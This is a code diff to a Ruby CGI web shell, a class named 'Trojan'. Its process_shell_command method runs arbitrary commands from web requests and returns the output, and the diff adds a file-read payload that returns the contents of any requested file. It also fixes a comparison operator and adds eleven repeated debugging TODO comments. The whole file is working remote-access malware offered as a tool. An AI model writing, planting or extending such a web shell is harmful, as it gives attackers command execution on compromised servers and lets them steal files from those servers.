@@ -34,6 +34,17 @@ class Trojan
     end
 
     def process_shell_command command
+        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
+        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
+        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
+        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
+        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
+        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
+        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
+        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
+        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
+        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
+        # @TODO: NO OUTPUT IS BEING SENT. I AM HERE.
         std_lines           = `cd #{@cwd}; #{command} 2>&1; pwd`.split("\n");
         @cwd                = @session[:cwd] = std_lines.pop
         @response['output'] = std_lines.join "\n",
@@ -42,7 +53,6 @@ class Trojan
 
     def send_response
         @response['prompt_context'] = self.get_prompt_context
-
         puts @cgi.header('Access-Control-Allow-Origin: *')
         puts @response.to_json
         exit
@@ -51,7 +61,7 @@ class Trojan
     def get_prompt_context
         whoami          =  `whoami`.strip!
         hostname        =  `hostname`.strip!
-        line_terminator =  (whoami ===  'root') ? '#' : '$';
+        line_terminator =  (whoami == 'root') ? '#' : '$';
         return "#{whoami}@#{hostname}:#{@cwd}#{line_terminator}";
     end
 
@@ -84,10 +94,18 @@ class Trojan
 
     def payload_file_read json
         Dir.chdir @cwd
+        dl_file = json['args[file]'].first
 
-        unless File.readable? json['args[file]'].first
-            @response['error'] = 'File is not readable or does not exist.',
+        unless File.readable? dl_file
+            @response['error'] = 'File is not readable or does not exist.'
+        else
+            @response['output'] = {
+                'output' => File.read(dl_file),
+                'file'   => File.realpath(dl_file),
+            }
         end
+
+        self.send_response
     end
 end
 
